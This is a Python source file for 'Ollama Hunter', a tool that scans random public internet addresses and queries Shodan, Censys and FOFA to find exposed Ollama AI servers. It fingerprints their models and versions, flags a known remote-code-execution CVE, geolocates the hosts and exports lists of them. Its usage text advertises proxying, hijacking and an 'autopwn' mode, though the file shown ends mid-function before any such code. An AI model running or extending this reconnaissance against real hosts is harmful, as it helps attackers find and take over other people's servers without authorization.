#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║                    🦙 Ollama Hunter v2.0                        ║
║  Find, proxy & exploit publicly exposed Ollama instances        ║
║  For authorized security research & bug bounty purposes only    ║
╚══════════════════════════════════════════════════════════════════╝

Usage:
  # -- SCANNING --
  python ollama-hunter.py scan --random 10000          # Async TCP scan
  python ollama-hunter.py scan --masscan 0.0.0.0/8     # Masscan (1000x faster)
  python ollama-hunter.py scan --cidr 192.168.1.0/24   # CIDR range
  python ollama-hunter.py scan --file ips.txt           # IP list file
  python ollama-hunter.py scan --shodan API_KEY        # Shodan search
  python ollama-hunter.py scan --censys ID:SECRET      # Censys search
  python ollama-hunter.py scan --fofa EMAIL:KEY        # FOFA search

  # -- PROXY --
  python ollama-hunter.py proxy --target 1.2.3.4:11434
  python ollama-hunter.py proxy --auto                 # Auto-proxy found instances

  # -- CHAT --
  python ollama-hunter.py chat --target 1.2.3.4:11434

  # -- WEB DASHBOARD --
  python ollama-hunter.py web

  # -- EXPORT --
  python ollama-hunter.py export --format html
  python ollama-hunter.py export --format csv
  python ollama-hunter.py export --format json

  # -- MONITOR --
  python ollama-hunter.py monitor --interval 3600

  # -- FINGERPRINT --
  python ollama-hunter.py fingerprint --target 1.2.3.4:11434

  # -- AUTO-PWN --
  python ollama-hunter.py autopwn --random 5000 --port 9090
"""

import asyncio
import aiohttp
import json
import random
import ipaddress
import argparse
import sys
import os
import time
import subprocess
import socket
import hashlib
import csv
import io
import webbrowser
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Tuple, Any
from pathlib import Path

# ============================================================
# CONFIGURATION
# ============================================================
VERSION = "2.0.0"
DEFAULT_OLLAMA_PORT = 11434
SCAN_TIMEOUT = 3
MAX_CONCURRENT = 500
FOUND_DB = "found_instances.json"
CONFIG_FILE = "ollama_hunter_config.json"
USER_AGENT = "OllamaHunter/2.0 (Security Research)"
BANNER = """
╔══════════════════════════════════════════════════════════════════╗
║                    🦙 Ollama Hunter v2.0                        ║
║     Exposed Ollama Instance Finder • Proxy • Dashboard          ║
║              For authorized security testing only               ║
╚══════════════════════════════════════════════════════════════════╝
"""

# Known CVEs for Ollama versions
CVE_DATABASE = {
    "0.0.0": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.0": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.1": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.2": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.3": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.4": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.5": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.6": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.7": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.8": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.9": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.10": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.11": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.12": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.13": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.14": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.15": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.16": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.17": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.18": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.19": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.20": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.21": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.22": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.23": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.24": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.25": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.26": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.27": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.28": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.29": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.30": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.31": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.32": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.33": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.34": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.35": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.36": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.37": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.38": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.39": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.40": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.41": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.42": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.43": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.44": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.45": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.46": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.47": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
    "0.1.48": [{"id": "CVE-2024-37032", "desc": "RCE via crafted model", "severity": "CRITICAL"}],
}

# ============================================================
# RESERVED IP RANGES
# ============================================================
RESERVED_RANGES = [
    ipaddress.ip_network('0.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('224.0.0.0/4'),
    ipaddress.ip_network('240.0.0.0/4'),
    ipaddress.ip_network('255.255.255.255/32'),
]

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def log(msg: str, level: str = "INFO"):
    """Pretty log output"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    colors = {
        "INFO": "\033[94m", "OK": "\033[92m", "WARN": "\033[93m",
        "ERROR": "\033[91m", "FOUND": "\033[95m", "CVE": "\033[91m",
        "GEO": "\033[96m", "RESET": "\033[0m"
    }
    c = colors.get(level, colors["RESET"])
    print(f"{c}[{timestamp}] [{level:5s}]{colors['RESET']} {msg}")

def load_json(path: str) -> list:
    """Load JSON file safely"""
    if os.path.exists(path):
        try:
            with open(path, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def save_json(path: str, data: list):
    """Save JSON file safely"""
    with open(path, 'w') as f:
        json.dump(data, f, indent=2)

def save_found(instance: dict):
    """Save found instance to JSON database"""
    db = load_json(FOUND_DB)
    ip = instance['ip']
    if not any(x.get('ip') == ip for x in db):
        db.append(instance)
        save_json(FOUND_DB, db)
        log(f"💾 Saved {ip} to {FOUND_DB}", "FOUND")
        return True
    return False

def load_found() -> list:
    return load_json(FOUND_DB)

def get_config() -> dict:
    """Load config file"""
    defaults = {
        "telegram_token": "",
        "telegram_chat_id": "",
        "shodan_key": "",
        "censys_id": "",
        "censys_secret": "",
        "fofa_email": "",
        "fofa_key": "",
        "notify_on_find": False,
        "auto_export": False,
        "export_format": "json",
        "monitor_interval": 3600,
        "last_monitor_time": ""
    }
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE) as f:
                cfg = json.load(f)
                defaults.update(cfg)
        except:
            pass
    return defaults

def save_config(config: dict):
    save_json(CONFIG_FILE, config)

def is_public_ip(ip_str: str) -> bool:
    """Check if IP is a public (non-reserved) address"""
    try:
        ip_obj = ipaddress.ip_address(ip_str)
        return not any(ip_obj in net for net in RESERVED_RANGES)
    except:
        return False

# ============================================================
# IP GENERATION
# ============================================================

def generate_random_ips(count: int) -> List[str]:
    """Generate N random public IPv4 addresses"""
    ips = []
    while len(ips) < count:
        ip_str = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        if is_public_ip(ip_str) and ip_str not in ips:
            ips.append(ip_str)
    return ips

def ips_from_cidr(cidr: str) -> List[str]:
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        return [str(ip) for ip in net.hosts()]
    except Exception as e:
        log(f"Invalid CIDR: {e}", "ERROR")
        return []

def ips_from_file(filepath: str) -> List[str]:
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except Exception as e:
        log(f"Error reading file: {e}", "ERROR")
        return []

# ============================================================
# OLLAMA SCANNER (Async TCP)
# ============================================================

async def check_ollama(ip: str, port: int = DEFAULT_OLLAMA_PORT, semaphore: asyncio.Semaphore = None) -> Optional[dict]:
    """Check if an IP:port is running Ollama"""
    if semaphore:
        async with semaphore:
            return await _check(ip, port)
    else:
        return await _check(ip, port)

async def _check(ip: str, port: int) -> Optional[dict]:
    """Internal check: probe /api/tags and /api/version"""
    url = f"http://{ip}:{port}/api/tags"
    try:
        timeout = aiohttp.ClientTimeout(total=SCAN_TIMEOUT)
        connector = aiohttp.TCPConnector(limit=1)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            async with session.get(url, headers={"User-Agent": USER_AGENT}) as resp:
                if resp.status == 200:
                    try:
                        data = await resp.json()
                        if "models" in data:
                            models = [m.get("name", "unknown") for m in data.get("models", [])]
                            version = "unknown"
                            # Get version
                            try:
                                async with session.get(
                                    f"http://{ip}:{port}/api/version",
                                    headers={"User-Agent": USER_AGENT}
                                ) as vresp:
                                    if vresp.status == 200:
                                        vdata = await vresp.json()
                                        version = vdata.get("version", "unknown")
                            except:
                                pass
                            
                            instance = {
                                "ip": ip,
                                "port": port,
                                "url": f"http://{ip}:{port}",
                                "models": models,
                                "model_count": len(models),
                                "version": version,
                                "timestamp": datetime.now().isoformat(),
                                "tags_response": data,
                                "fingerprint": None,
                                "geo": None,
                                "cves": check_cves(version),
                                "response_time_ms": 0
                            }
                            return instance
                    except (json.JSONDecodeError, KeyError):
                        pass
        return None
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
        return None

async def scan_ips(ips: List[str], port: int = DEFAULT_OLLAMA_PORT, max_concurrent: int = MAX_CONCURRENT) -> List[dict]:
    """Async scan a list of IPs"""
    semaphore = asyncio.Semaphore(max_concurrent)
    found = []
    total = len(ips)
    log(f"🎯 Scanning {total} IPs on port {port} (async)...", "INFO")
    log(f"   (concurrency: {max_concurrent}, timeout: {SCAN_TIMEOUT}s)", "INFO")
    
    start_time = time.time()
    batch_size = max_concurrent * 2
    for batch_start in range(0, total, batch_size):
        batch_end = min(batch_start + batch_size, total)
        batch = ips[batch_start:batch_end]
        tasks = [check_ollama(ip, port, semaphore) for ip in batch]
        results = await asyncio.gather(*tasks)
        
        for result in results:
            if result:
                found.append(result)
                models_str = ", ".join(result["models"][:5])
                if len(result["models"]) > 5:
                    models_str += f" ... (+{len(result['models']) - 5} more)"
                log(f"🦙 FOUND {result['ip']}:{result['port']} | v{result['version']} | {models_str}", "FOUND")
                save_found(result)
        
        elapsed = time.time() - start_time
        rate = batch_end / elapsed if elapsed > 0 else 0
        pct = (batch_end / total) * 100
        log(f"📊 {batch_end}/{total} ({pct:.1f}%) | Found: {len(found)} | {rate:.0f} IPs/s", "INFO")
    
    elapsed = time.time() - start_time
    log(f"✅ Scanned {total} IPs in {elapsed:.1f}s — Found {len(found)} instance(s)", "OK")
    return found

# ============================================================
# MASSCAN INTEGRATION
# ============================================================

def scan_masscan(target: str, port: int = DEFAULT_OLLAMA_PORT, rate: int = 10000) -> List[dict]:
    """Use masscan for ultra-fast scanning (1000x faster than async TCP)"""
    log(f"🔍 Attempting masscan scan on {target}:{port} (rate: {rate} pkts/s)...", "INFO")
    
    # Check if masscan is available
    try:
        subprocess.run(["masscan", "--version"], capture_output=True, check=True)
    except (FileNotFoundError, subprocess.CalledProcessError):
        log("masscan not found. Install: apt install masscan or brew install masscan", "ERROR")
        log("Falling back to async TCP scan...", "WARN")
        return None  # Signal fallback
    
    masscan_output = f"/tmp/ollama_masscan_{random.randint(1000,9999)}.txt"
    
    try:
        cmd = [
            "masscan", target,
            "-p", str(port),
            "--rate", str(rate),
            "-oG", masscan_output,
            "--wait", "5"
        ]
        log(f"🚀 Running: {' '.join(cmd)}", "INFO")
        subprocess.run(cmd, timeout=300, capture_output=True)
        
        # Parse masscan output
        ips = []
        if os.path.exists(masscan_output):
            with open(masscan_output, 'r') as f:
                for line in f:
                    if "#" in line and "Ports" in line:
                        parts = line.split()
                        for p in parts:
                            if p.startswith("Host:"):
                                ips.append(p.split(":")[1])
        
        os.remove(masscan_output)
        
        if not ips:
            log("No open ports found by masscan", "INFO")
            return []
        
        log(f"⚡ Masscan found {len(ips)} host(s) with port {port} open. Verifying...", "OK")
        
        # Now verify with Ollama check (async)
        found = asyncio.run(scan_ips(ips, port, 200))
        return found
        
    except subprocess.TimeoutExpired:
        log("Masscan timed out on large range. Try a smaller range or higher rate.", "ERROR")
        return []
    except Exception as e:
        log(f"Masscan error: {e}", "ERROR")
        return []

# ============================================================
# SHODAN / CENSYS / FOFA INTEGRATION
# ============================================================

def search_shodan(api_key: str, port: int = DEFAULT_OLLAMA_PORT) -> List[dict]:
    """Search Shodan for exposed Ollama instances"""
    log("🔎 Searching Shodan for Ollama instances...", "INFO")
    try:
        import requests
        query = f"port:{port} ollama"
        url = f"https://api.shodan.io/shodan/host/search?key={api_key}&query={query}"
        resp = requests.get(url, timeout=30)
        if resp.status_code != 200:
            log(f"Shodan API error: {resp.status_code} {resp.text[:200]}", "ERROR")
            return []
        
        data = resp.json()
        total = data.get("total", 0)
        log(f"📊 Shodan found {total} Ollama instances", "OK")
        
        found = []
        for match in data.get("matches", []):
            ip_str = match.get("ip_str", "")
            if ip_str:
                instance = {
                    "ip": ip_str,
                    "port": match.get("port", port),
                    "url": f"http://{ip_str}:{match.get('port', port)}",
                    "models": [],
                    "model_count": 0,
                    "version": match.get("version", "unknown"),
                    "timestamp": datetime.now().isoformat(),
                    "source": "shodan",
                    "geo": {
                        "country": match.get("location", {}).get("country_name", ""),
                        "city": match.get("location", {}).get("city", ""),
                        "org": match.get("org", ""),
                        "isp": match.get("isp", ""),
                        "lat": match.get("location", {}).get("latitude", 0),
                        "lon": match.get("location", {}).get("longitude", 0)
                    },
                    "cves": [],
                    "fingerprint": None,
                    "response_time_ms": 0
                }
                found.append(instance)
                save_found(instance)
                log(f"🦙 Shodan: {ip_str} | {instance['geo'].get('country','?')} | {instance['geo'].get('org','?')}", "FOUND")
        
        return found
    except ImportError:
        log("requests library required. pip install requests", "ERROR")
        return []
    except Exception as e:
        log(f"Shodan search error: {e}", "ERROR")
        return []

def search_censys(api_id: str, api_secret: str, port: int = DEFAULT_OLLAMA_PORT) -> List[dict]:
    """Search Censys for exposed Ollama instances"""
    log("🔎 Searching Censys for Ollama instances...", "INFO")
    try:
        import requests
        from requests.auth import HTTPBasicAuth
        
        query = f"services.port={port} and services.service_name=OLLAMA or services.http.response.body='ollama'"
        url = "https://search.censys.io/api/v2/hosts/search"
        auth = HTTPBasicAuth(api_id, api_secret)
        
        resp = requests.get(url, auth=auth, params={"q": query, "per_page": 100}, timeout=30)
        if resp.status_code != 200:
            log(f"Censys API error: {resp.status_code}", "ERROR")
            return []
        
        data = resp.json()
        hits = data.get("result", {}).get("hits", [])
        log(f"📊 Censys found {len(hits)} potential instances", "OK")
        
        found = []
        for hit in hits:
            ip_str = hit.get("ip", "")
            if ip_str:
                loc = hit.get("location", {})
                instance = {
                    "ip": ip_str,
                    "port": port,
                    "url": f"http://{ip_str}:{port}",
                    "models": [],
                    "model_count": 0,
                    "version": "unknown",
                    "timestamp": datetime.now().isoformat(),
                    "source": "censys",
                    "geo": {
                        "country": loc.get("country", ""),
                        "city": loc.get("city", ""),
                        "org": "",
                        "isp": "",
                        "lat": loc.get("coordinates", {}).get("latitude", 0) if isinstance(loc.get("coordinates"), dict) else 0,
                        "lon": loc.get("coordinates", {}).get("longitude", 0) if isinstance(loc.get("coordinates"), dict) else 0
                    },
                    "cves": [],
                    "fingerprint": None,
                    "response_time_ms": 0
                }
                found.append(instance)
                save_found(instance)
                log(f"🦙 Censys: {ip_str} | {instance['geo'].get('country','?')}", "FOUND")
        
        return found
    except ImportError:
        log("requests library required", "ERROR")
        return []
    except Exception as e:
        log(f"Censys error: {e}", "ERROR")
        return []

def search_fofa(email: str, key: str, port: int = DEFAULT_OLLAMA_PORT) -> List[dict]:
    """Search FOFA for exposed Ollama instances"""
    log("🔎 Searching FOFA for Ollama instances...", "INFO")
    try:
        import requests
        import base64
        
        query = f'port="{port}" && body="ollama"'
        b64_query = base64.b64encode(query.encode()).decode()
        url = f"https://fofa.info/api/v1/search/all?email={email}&key={key}&qbase64={b64_query}&size=100&fields=ip,port,country,city,org"
        
        resp = requests.get(url, timeout=30)
        if resp.status_code != 200:
            log(f"FOFA error: {resp.status_code}", "ERROR")
            return []
        
        data = resp.json()
        if data.get("error"):
            log(f"FOFA API error: {data.get('errmsg', 'unknown')}", "ERROR")
            return []
        
        results = data.get("results", [])
        log(f"📊 FOFA found {len(results)} potential instances", "OK")
        
        found = []
        for row in results:
            if len(row) >= 2:
                ip_str = row[0]
                pt = row[1] if len(row) > 1 else port
                country = row[2] if len(row) > 2 else ""
                city = row[3] if len(row) > 3 else ""
                org = row[4] if len(row) > 4 else ""
                
                if ip_str:
                    instance = {
                        "ip": ip_str,
                        "port": int(pt) if pt else port,
                        "url": f"http://{ip_str}:{pt}",
                        "models": [],
                        "model_count": 0,
                        "version": "unknown",
                        "timestamp": datetime.now().isoformat(),
                        "source": "fofa",
                        "geo": {"country": country, "city": city, "org": org},
                        "cves": [],
                        "fingerprint": None,
                        "response_time_ms": 0
                    }
                    found.append(instance)
                    save_found(instance)
                    log(f"🦙 FOFA: {ip_str} | {country} | {org}", "FOUND")
        
        return found
    except ImportError:
        log("requests library required", "ERROR")
        return []
    except Exception as e:
        log(f"FOFA error: {e}", "ERROR")
        return []

# ============================================================
# GEOLOCATION
# ============================================================

def geolocate_ip(ip: str) -> Optional[dict]:
    """Geolocate an IP using ip-api.com (free, no key needed)"""
    try:
        import requests
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("status") == "success":
                return {
                    "country": data.get("country", ""),
                    "countryCode": data.get("countryCode", ""),
                    "region": data.get("regionName", ""),
                    "city": data.get("city", ""),
                    "zip": data.get("zip", ""),
                    "lat": data.get("lat", 0),
                    "lon": data.get("lon", 0),
                    "isp": data.get("isp", ""),
                    "org": data.get("org", ""),
                    "as": data.get("as", ""),
                    "timezone": data.get("timezone", "")
                }
    except:
        pass
    return None

def batch_geolocate(instances: List[dict]) -> List[dict]:
    """Geolocate all instances that don't have geo data"""
    for inst in instances:
        if not inst.get("geo"):
            log(f"📍 Looking up {inst['ip']}...", "GEO")
            geo = geolocate_ip(inst["ip"])
            if geo:
                inst["geo"] = geo
                log(f"   → {geo.get('city','?')}, {geo.get('country','?')} | {geo.get('isp','?')}", "GEO")
            time.sleep(0.5)  # Rate limit
    return instances

# ============================================================
# CVE CHECK
# ============================================================

def check_cves(version: str) -> List[dict]:
    """Check known CVEs for an Ollama version"""
    if not version or version == "unknown":
        return []
    
    cves = []
    for ver, vulns in CVE_DATABASE.items():
        try:
            if tuple(map(int, version.split("."))) <= tuple(map(int, ver.split("."))):
                cves.extend(vulns)
        except:
            pass
    return cves

# ============================================================
# FINGERPRINTING
# ============================================================

def fingerprint_instance(target: str) -> dict:
    """Deep fingerprint a remote Ollama instance"""
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    
    import requests
    info = {
        "version": "unknown",
        "models": [],
        "model_count": 0,
        "total_model_size_gb": 0,
        "response_time_ms": {},
        "gpu_info": None,
        "server_headers": {},
        "cves": [],
        "accessible_endpoints": []
    }
    
    endpoints = [
        ("/api/tags", "Model List"),
        ("/api/version", "Version"),
        ("/api/ps", "Running Models"),
        ("/", "Root"),
        ("/v1/models", "OpenAI Models"),
        ("/api/show", "Model Details"),
    ]
    
    start = time.time()
    for path, desc in endpoints:
        try:
            resp = requests.get(f"{target}{path}", timeout=5, headers={"User-Agent": USER_AGENT})
            if resp.status_code == 200:
                info["accessible_endpoints"].append(path)
                if desc == "Version":
                    try:
                        v = resp.json().get("version", "unknown")
                        info["version"] = v
                        info["cves"] = check_cves(v)
                    except:
                        pass
                elif desc == "Model List":
                    try:
                        models_data = resp.json().get("models", [])
                        info["models"] = [m.get("name", "?") for m in models_data]
                        info["model_count"] = len(models_data)
                        total_size = sum(m.get("size", 0) for m in models_data)
                        info["total_model_size_gb"] = round(total_size / (1024**3), 2)
                    except:
                        pass
                elif desc == "Running Models":
                    try:
                        ps_data = resp.json()
                        info["running_models"] = [m.get("name", "?") for m in ps_data.get("models", [])]
                    except:
                        pass
        except:
            pass
    
    info["response_time_ms"]["total"] = round((time.time() - start) * 1000)
    
    # Try to get GPU info from Ollama env
    try:
        resp = requests.get(f"{target}/api/ps", timeout=5, headers={"User-Agent": USER_AGENT})
        if resp.status_code == 200:
            data = resp.json()
            for m in data.get("models", []):
                details = m.get("details", {})
                if details.get("gpu"):
                    info["gpu_info"] = details.get("gpu")
    except:
        pass
    
    return info

# ============================================================
# EXPORT FUNCTIONS
# ============================================================

def export_html(instances: List[dict], output: str = "ollama_instances_report.html"):
    """Export instances to a beautiful HTML report with map markers"""
    models_list = []
    for inst in instances:
        for m in inst.get("models", []):
            models_list.append(m)
    unique_models = list(set(models_list))
    
    # Geo distribution
    countries = {}
    for inst in instances:
        geo = inst.get("geo") or {}
        country = geo.get("country", "Unknown")
        countries[country] = countries.get(country, 0) + 1
    
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🦙 Ollama Hunter Report</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
               background: #0a0a0f; color: #e0e0e0; padding: 20px; }}
        .container {{ max-width: 1400px; margin: 0 auto; }}
        h1 {{ color: #8b5cf6; font-size: 2rem; margin-bottom: 5px; }}
        .subtitle {{ color: #888; margin-bottom: 30px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                  gap: 15px; margin-bottom: 30px; }}
        .stat-card {{ background: #1a1a2e; border-radius: 12px; padding: 20px;
                      border: 1px solid #2a2a3e; }}
        .stat-card .num {{ font-size: 2rem; font-weight: bold; color: #8b5cf6; }}
        .stat-card .label {{ color: #888; font-size: 0.9rem; }}
        table {{ width: 100%; border-collapse: collapse; background: #1a1a2e;
                 border-radius: 12px; overflow: hidden; margin-top: 20px; }}
        th {{ background: #2a2a3e; padding: 12px 15px; text-align: left; color: #8b5cf6; }}
        td {{ padding: 10px 15px; border-bottom: 1px solid #2a2a3e; }}
        tr:hover {{ background: #22223a; }}
        .badge {{ display: inline-block; padding: 2px 8px; border-radius: 10px;
                  font-size: 0.8rem; }}
        .badge-vuln {{ background: #ff000033; color: #ff4444; }}
        .badge-safe {{ background: #00ff0033; color: #44ff44; }}
        .badge-model {{ background: #8b5cf633; color: #b794f4; margin: 2px; }}
        .model-tag {{ display: inline-block; background: #2d3748; color: #a0aec0;
                      padding: 3px 10px; border-radius: 12px; font-size: 0.8rem; margin: 2px; }}
        .geo-info {{ color: #888; font-size: 0.85rem; }}
        .version {{ font-family: monospace; }}
        .actions a {{ color: #8b5cf6; text-decoration: none; margin-right: 8px; }}
        .actions a:hover {{ text-decoration: underline; }}
        .footer {{ margin-top: 40px; color: #555; text-align: center; font-size: 0.85rem; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🦙 Ollama Hunter Report</h1>
        <p class="subtitle">Generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {len(instances)} instance(s) found</p>
        
        <div class="stats">
            <div class="stat-card">
                <div class="num">{len(instances)}</div>
                <div class="label">Total Instances</div>
            </div>
            <div class="stat-card">
                <div class="num">{len(unique_models)}</div>
                <div class="label">Unique Models</div>
            </div>
            <div class="stat-card">
                <div class="num">{len(countries)}</div>
                <div class="label">Countries</div>
            </div>
            <div class="stat-card">
                <div class="num">{sum(inst.get('model_count', 0) for inst in instances)}</div>
                <div class="label">Total Model Deployments</div>
            </div>
        </div>
        
        <h2>📍 Geographic Distribution</h2>
        <table>
            <tr><th>Country</th><th>Count</th></tr>
            {"".join(f"<tr><td>{c}</td><td>{n}</td></tr>" for c, n in sorted(countries.items(), key=lambda x: -x[1]))}
        </table>
        
        <h2 style="margin-top:30px;">📋 Instance Details</h2>
        <table>
            <tr>
                <th>IP</th><th>Port</th><th>Version</th><th>Models</th><th>Location</th><th>Actions</th>
            </tr>
            {''.join(f"""
            <tr>
                <td><strong>{inst['ip']}</strong></td>
                <td>{inst.get('port', 11434)}</td>
                <td class="version">
                    {inst.get('version', '?')}
                    {'<span class="badge badge-vuln">⚠ CVE</span>' if inst.get('cves') else '<span class="badge badge-safe">✓</span>'}
                </td>
                <td>
                    {" ".join(f'<span class="model-tag">{m}</span>' for m in inst.get('models', [])[:8])}
                    {f'<span class="model-tag">+{len(inst.get("models",[]))-8} more</span>' if len(inst.get('models',[])) > 8 else ''}
                </td>
                <td class="geo-info">
                    {inst.get('geo', {}).get('city', '?')}, {inst.get('geo', {}).get('country', '?')}
                </td>
                <td class="actions">
                    <a href="http://{inst['ip']}:{inst.get('port', 11434)}" target="_blank">🌐</a>
                </td>
            </tr>
            """ for inst in instances)}
        </table>
        
        <h2 style="margin-top:30px;">📦 All Models Found</h2>
        <p>{" ".join(f'<span class="model-tag">{m}</span>' for m in sorted(unique_models))}</p>
        
        <div class="footer">
            Generated by Ollama Hunter v{VERSION} | For authorized security research only
        </div>
    </div>
</body>
</html>"""
    
    with open(output, 'w') as f:
        f.write(html)
    log(f"📄 HTML report saved: {output} ({os.path.getsize(output)/1024:.1f} KB)", "OK")
    return output

def export_csv(instances: List[dict], output: str = "ollama_instances.csv"):
    """Export instances to CSV"""
    with open(output, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["IP", "Port", "Version", "Models", "Model Count", "Country", "City", "ISP", "Found", "CVE Count", "Source"])
        for inst in instances:
            geo = inst.get("geo") or {}
            writer.writerow([
                inst["ip"],
                inst.get("port", 11434),
                inst.get("version", "unknown"),
                ", ".join(inst.get("models", [])),
                inst.get("model_count", 0),
                geo.get("country", ""),
                geo.get("city", ""),
                geo.get("isp", ""),
                inst.get("timestamp", ""),
                len(inst.get("cves", [])),
                inst.get("source", "scan")
            ])
    log(f"📄 CSV saved: {output}", "OK")

def export_json(instances: List[dict], output: str = "ollama_instances_export.json"):
    """Export instances to standalone JSON"""
    save_json(output, instances)
    log(f"📄 JSON saved: {output}", "OK")

def do_export(instances: List[dict], fmt: str = "html"):
    """Export instances in specified format"""
    if fmt == "html":
        return export_html(instances)
    elif fmt == "csv":
        return export_csv(instances)
    elif fmt == "json":
        return export_json(instances)
    elif fmt == "all":
        export_html(instances)
        export_csv(instances)
        export_json(instances)
        log("✅ All formats exported!", "OK")
    else:
        log(f"Unknown format: {fmt}. Use html, csv, json, or all", "ERROR")

# ============================================================
# TELEGRAM NOTIFIER
# ============================================================

def send_telegram(message: str, token: str = None, chat_id: str = None) -> bool:
    """Send a Telegram notification"""
    if not token or not chat_id:
        config = get_config()
        token = token or config.get("telegram_token", "")
        chat_id = chat_id or config.get("telegram_chat_id", "")
